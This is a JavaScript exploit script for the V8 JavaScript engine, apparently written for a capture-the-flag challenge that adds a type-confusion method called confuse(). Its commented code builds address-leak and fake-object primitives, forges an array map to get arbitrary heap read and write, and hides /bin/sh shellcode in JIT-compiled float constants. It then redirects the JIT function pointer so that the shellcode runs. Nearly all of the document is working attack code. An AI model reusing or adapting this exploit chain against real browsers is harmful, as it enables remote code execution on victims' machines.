let buf = new ArrayBuffer(8);
let f64_buf = new Float64Array(buf);
let u64_buf = new Uint32Array(buf);

// Convert float to uint64
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

// Convert uint64 to float
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Convert two uint32 to float64
function itof64(val_low, val_high) {
    let lower = Number(val_low);
    let upper = Number(val_high);
    u64_buf[0] = lower;
    u64_buf[1] = upper;
    return f64_buf[0];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK   = (m) => console.log(`[+] ${m}`);
const logErr  = (m) => console.log(`[-] ${m}`);

function toHex(value) {
    return "0x" + value.toString(16);
}

function assert(c, m="assert") {
  if (c) return;
  let at = "";
  try { at = ((new Error()).stack || "").split("\n")[2].trim(); } catch {}
  const e = new Error(`[ASSERT] ${m}` + (at ? `\n  at ${at}` : ""));
  if (Error.captureStackTrace) Error.captureStackTrace(e, assert);
  throw e;
}

let a = ["a", "b"];
function AddrOf(obj) {
    a[0] = obj;
    a.confuse();
    let ret_val = ftoi(a[0]) & 0xffffffffn; // mask to 32 bits
    // a now is PACKED_DOUBLE_ELEMENTS array, so "a" is stored as double
    // we need to revert it back to normal
    a[0] = "a";
    a.confuse();
    return ret_val;
}

function FakeObj(addr) {
    let fake = [1.1, 2.2, 3.3, 4.4, 5.5];
    fake[0] = itof(addr);
    fake.confuse();
    return fake[0];
}

/*
Now we're going to get an arbitrary read/write primitive. The code here is a little gross because
that's what happens when you do your first ever v8 exploit, but it's also not that hard.

Before I explain that, we need to know about 'maps'. Maps are the first part of all JS objects memory-wise,
because they tell JS how to read the contents of this object. Let's say we have an array 'a', and we want to print
a[0]. When we request that, JavaScript has to figure out what 'a' even is! To do this, it visits &a (in memory),
and the first field on 'a' is a pointer to its map. JavaScript visits that pointer, and the data at that
pointer explains to JavaScript to parse a's contents in-memory. Now that it knows this, it can parse everything past
&a and figure out how to find a[0].

So why is this important? Well, our next step is to craft a fake object in-memory, then use FakeObj() to
actually 'use' that object. We can write arbitrary content in memory with an array of floats, and we know
where that content is with AddrOf().

The object we're going to fake is an array of floats. If we trick JavaScript into treating our crafted memory
as an 'array of floats' object, we can change the 'elements' pointer (which points to the actual contents
of the array) to anything we want, and now we have an arbitrary read/write on the JS heap. The code below does this.
*/
let float_arr = [1.1, 1.2, 1.3, 1.4];
// %DebugPrint(float_arr);
let arb_read_arr = [itof(0x1234567890abcdefn), 1.1, 1.1, 1.1];
let arb_read_addr = AddrOf(arb_read_arr);
let elements_addr = arb_read_addr - 0x20n; // address of contents of arb_read_arr
// Write a fake map pointer at the start of our float array.
// *0x1cb86d points to the map for an array of floats.
// I can hardcode this due to pointer compression! This isn't affected by ASLR.
// (this would change on different chrome versions though)
arb_read_arr[0] = itof(0x1cb86dn);

let arb_write_arr = [itof(0x1cb86dn), 2.2, 2.2, 2.2];
let arb_write_addr = AddrOf(arb_write_arr);
let write_elements_addr = arb_write_addr - 0x20n; // address of contents of arb_write_arr

/*
Read data at 'addr'.

We overwrite the 'elements' pointer on our fake memory to point to 'addr',
use FakeObj() to treat our fake memory as our object, and then read the first element
of that faked object.
*/
function arbRead(addr) {
    arb_read_arr[1] = itof(BigInt("0x200000000") + (addr - 8n)); // set elements pointer to "addr"
    let fake = FakeObj(elements_addr); // treat our "fake" memory as an object
    return ftoi(fake[0]);
}

/*
Write 'val' to 'addr'.

The idea here is basically equivalent to arb_read(), we just write to fake[0] instead
of read from it. For some reason I had to set the map pointer here instead of
outside the function, not really sure why but whatever.
*/
function arbWrite(addr, val) {
    arb_write_arr[0] = itof(0x1cb86dn); // set map pointer
    arb_write_arr[1] = itof(BigInt("0x200000000") + (addr - 8n));
    let fake = FakeObj(write_elements_addr); // treat our "fake" memory as an object
    fake[0] = itof(val);
}
/*
Okay, now we have an arbitrary read/write on the JS heap. How should we get RCE with this?

One very abusable feature of JavaScript is its JIT. Essentially, if a function is called A BUNCH,
JavaScript will go "oh this function is a hotpath, i should optimize it" and convert the function to
pure assembly. From that point on, any time that function is called, that assembly code will be used instead.

Our first step to exploiting this is to actually trigger that JIT optimization. It's pretty simple: just call
the function 10,000 times, then stall the code for a bit. Seriously!

Now we exploit it. First, we're going to trick the JIT into optimizing shellcode! How? Well, we can put an array
of floats in our function, and when that function gets JIT optimized, the raw floats will also be placed into the
assembly. So, we can convert some /bin/sh shellcode into an array of floats, put that in our to-be-optimized function,
and then the JIT will write that into the assembly!

Of course, just because the shellcode is in the assembly doesn't mean it's actually going to be called yet. We're
basically 'encoding' our shellcode into the actual assembly being executed. So how do we execute our shellcode?

With our arbitrary write! We can get the address of that JIT function in memory, and slightly shift its function
pointer (this pointer doesn't have pointer compression) to point to our shellcode instead of the actual function.
Now, when we call that function, our JIT shellcode will run instead!

The code below does that.
*/

function int3() {
     return [
       // Anvbis' /bin/sh shellcode
       1.9711828979523134e-246,
       1.9562205631094693e-246,
       1.9557819155246427e-246,
       1.9711824228871598e-246,
       1.971182639857203e-246,
       1.9711829003383248e-246,
       1.9895153920223886e-246,
       1.971182898881177e-246
    ]
}


// Useless to stall for a little bit.
function wait() {
    let j = 5;
    for (let i = 0; i < 10000000; i++){
        j += 5;
    }
    return j;
}

// Call int3() 10000 times, queueing JIT optimization.
for (let i = 0; i < 10000; i++){
    int3();
}

//  Wait a little bit for the function to get optimized.
let m = wait();

// %DebugPrint(int3);

let int3_addr = AddrOf(int3);
logOK("int3 addr: " + toHex(int3_addr));

// Get the address of the JIT code.
// Remember, we need to mask to 32 bits due to pointer compression
let code_ptr = arbRead(int3_addr+0xcn) & 0xffffffffn;
logOK("int3 code addr: " + toHex(code_ptr));

// Now with that code_ptr offset, we can easily get the RWX memory address.
// 64-bits address didn't matter here, since the `instruction_start` is a full pointer
// BUT: the address we waint to read must be 32-bits due to pointer compression
let rwx_addr = arbRead(code_ptr+0x14n);
logOK("rwx addr: " + toHex(rwx_addr));

// Our shellcode to write.
let shellcode_address = rwx_addr + 0x69n + 2n;
logInfo("Writing shellcode to: " + toHex(shellcode_address));
arbWrite(code_ptr+0x14n, shellcode_address);

logOK("Triggering...");
int3();
// %SystemBreak();
